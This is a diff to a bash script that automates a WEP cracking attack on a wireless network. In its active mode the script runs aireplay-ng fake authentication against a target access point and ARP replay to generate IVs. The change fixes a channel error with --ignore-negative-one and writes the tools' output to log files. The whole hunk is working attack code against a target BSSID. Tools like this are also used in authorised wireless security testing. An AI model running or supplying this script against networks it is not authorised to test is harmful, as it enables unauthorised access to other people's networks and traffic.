@@ -99,14 +99,19 @@ fi
 
 if [[ "$MODE" == "active" ]]; then
   echo "[*] Associating with AP (fake auth)..."
-  # keep re-authenticating every 10s so we stay associated
-  aireplay-ng --fakeauth 10 -o 1 -q 10 -a "$BSSID" -h "$MYMAC" \
-    ${ESSID:+-e "$ESSID"} "$MON" >/dev/null 2>&1 &
-  track_pid $!
+  # keep re-authenticating every 10s so we stay associated. --ignore-negative-one: aireplay-ng
+  # cannot read the monitor channel that wifi_set_channel set, and without the flag it exits.
+  # Run from logs/, so the replay_arp-*.cap it writes lands there. stdbuf keeps the logs current.
+  ( cd "$LOGDIR" && exec stdbuf -oL aireplay-ng --ignore-negative-one --fakeauth 10 -o 1 -q 10 \
+      -a "$BSSID" -h "$MYMAC" ${ESSID:+-e "$ESSID"} "$MON" ) >"${OUT}-fakeauth.txt" 2>&1 &
+  fakeauth_pid=$!
+  track_pid "$fakeauth_pid"
 
   echo "[*] Starting ARP replay to pump IVs (this is the key step)..."
-  aireplay-ng --arpreplay -b "$BSSID" -h "$MYMAC" "$MON" >/dev/null 2>&1 &
-  track_pid $!
+  ( cd "$LOGDIR" && exec stdbuf -oL aireplay-ng --ignore-negative-one --arpreplay -b "$BSSID" -h "$MYMAC" "$MON" ) \
+    >"${OUT}-arpreplay.txt" 2>&1 &
+  arp_pid=$!
+  track_pid "$arp_pid"
 else
   echo "[*] PASSIVE mode: capturing only. IVs will accrue slowly from live traffic."
 fi
